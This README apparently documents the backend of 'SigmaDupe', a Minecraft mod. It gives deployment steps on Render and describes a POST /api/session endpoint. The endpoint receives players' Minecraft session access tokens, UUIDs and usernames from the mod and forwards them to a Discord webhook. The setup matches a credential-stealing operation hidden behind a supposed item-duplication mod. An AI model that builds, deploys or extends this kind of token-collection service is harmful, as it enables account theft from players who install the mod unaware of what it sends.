# SigmaDupe Backend Service

This is the backend service for the SigmaDupe Minecraft mod. It receives Minecraft session information from the mod and forwards it to a Discord webhook.

## Features

- Receives session information (access token, UUID, username) from the Minecraft mod
- Forwards the information to a Discord webhook
- Provides a health check endpoint for monitoring

## Deployment to Render

Follow these steps to deploy the backend service to Render:

1. Create a new account on [Render](https://render.com/) if you don't have one already.

2. Click on the "New +" button and select "Web Service".

3. Connect your GitHub repository or use the "Public Git repository" option with the URL of your repository.

4. Configure the service with the following settings:
   - **Name**: `backened-jbma` (or your preferred name)
   - **Environment**: `Node`
   - **Build Command**: `npm install`
   - **Start Command**: `npm start`
   - **Root Directory**: `backend` (if your backend code is in a subdirectory)

5. Set the following environment variables if needed:
   - `PORT`: The port your service will run on (Render will set this automatically)

6. Click "Create Web Service" to deploy your backend.

7. Once deployed, your service will be available at `https://backened-jbma.onrender.com` (or the URL provided by Render).

## Local Development

To run the service locally:

1. Install dependencies:
   ```
   npm install
   ```

2. Start the server:
   ```
   npm start
   ```

3. The server will run on port 3000 by default. You can change this by setting the `PORT` environment variable.

## API Endpoints

- `GET /`: Simple home route that returns a welcome message
- `GET /health`: Health check endpoint that returns a 200 status code
- `POST /api/session`: Endpoint to receive session information from the Minecraft mod
  - Request body should be a JSON object with the following fields:
    - `accessToken`: The Minecraft session access token
    - `uuid`: The player's UUID
    - `username`: The player's username
  - Returns a 200 status code on success, or an appropriate error code on failure